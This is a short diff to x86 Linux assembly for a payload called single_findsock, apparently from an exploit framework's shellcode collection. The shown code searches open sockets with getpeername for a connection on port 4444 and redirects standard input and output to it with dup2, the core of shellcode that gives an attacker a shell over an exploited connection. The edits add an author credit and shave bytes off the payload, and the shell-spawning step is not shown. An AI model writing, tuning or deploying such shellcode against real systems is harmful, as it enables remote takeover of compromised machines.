@@ -3,6 +3,7 @@
 ;        Name: single_findsock
 ;   Platforms: Linux
 ;     Authors: vlad902 <vlad902 [at] gmail.com>
+;     Authors: skape <mmiller [at] hick.org>
 ;     Version: $Revision$
 ;     License:
 ;
@@ -35,7 +36,6 @@ main:
 
 	mov	ecx, esp
 getpeername_loop:
-; 32-bit is okay since the connection should be established already.
 	inc	dword [ecx]
 
 	push	byte 0x66
@@ -45,13 +45,12 @@ getpeername_loop:
 	cmp	word [ebp + 2], 0x5c11
 	jne	getpeername_loop
 
-	mov	ebx, [ecx]
+	pop	ebx
 	push	byte 0x02
 	pop	ecx
 
 dup2_loop:
-	push	byte 0x3f
-	pop	eax
+	mov	al, 0x3f
 	int	0x80
 	dec	ecx
 	jns	dup2_loop
